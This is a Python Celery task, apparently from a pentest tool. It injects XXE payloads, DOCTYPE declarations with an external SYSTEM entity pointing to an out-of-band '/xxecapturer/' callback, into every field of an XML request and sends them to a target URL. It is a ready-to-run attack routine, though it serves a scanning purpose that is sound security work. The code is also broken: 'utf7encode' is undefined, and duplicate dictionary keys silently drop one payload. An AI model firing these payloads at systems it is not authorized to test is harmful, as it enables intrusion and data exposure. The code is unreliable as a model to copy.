from celery import shared_task
from pentest.helpers.utils import RequestWrapper, finishTest
from collections import OrderedDict
import xmltodict
import dicttoxml
import json
import re
import requests
from pentest.models import Payload

def payload_inserter (d, payload):
    for k, v in d.items():
        if isinstance (v, OrderedDict):
            payload_inserter(v, payload)
        else:
            if d is not None:
                d[k] = payload

@shared_task
def XXETest(url, test_id, request_method, headers, data_format, body):

    # r = requests.get("http://127.0.0.1:4040/api/tunnels")
    # resp = r.json()
    # ngrok_url = resp["tunnels"][0]["public_url"]
    ngrok_url = "http://localhost"
   

    body = xmltodict.parse(body)

    payloads = {
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "URLHERE">] >': None,
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "URLHERE">] >': "&xxe;",
        utf7encode('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "URLHERE">] >'): None,
    }

    for (header, payload) in payloads.items():
        # build the url for the malicious xml header
        pl_id = Payload.objects.last().id+1
        xxe_url = ngrok_url + '/xxecapturer/' + str(pl_id)
        header = re.sub("URLHERE", xxe_url, header)

        # replace xml values in body
        current_body = body
        payload_inserter(current_body, payload)
        current_body = dicttoxml.dicttoxml(current_body)
        current_body = re.sub("&amp;", "&", current_body.decode())

        # combine malicious xml header and body
        current_body = header + current_body

        # send the request
        req = RequestWrapper(url, request_method, headers, data_format, str(current_body), immediate_request=False)
        req.saveRequestAsPayload("XXE IN PROGRESS", test_id)
        req.makeRequest()
        # sleep(10)

    finishTest(test_id)

#test_id = 5
#payload_id = 100
#payload_string = "XXE Unsuccessful"
#masuk /5/100, diganti jadi successfull. Sleep(20)
#Masih unsuccessful

#insert payload_id, dapetin payload_id terakhir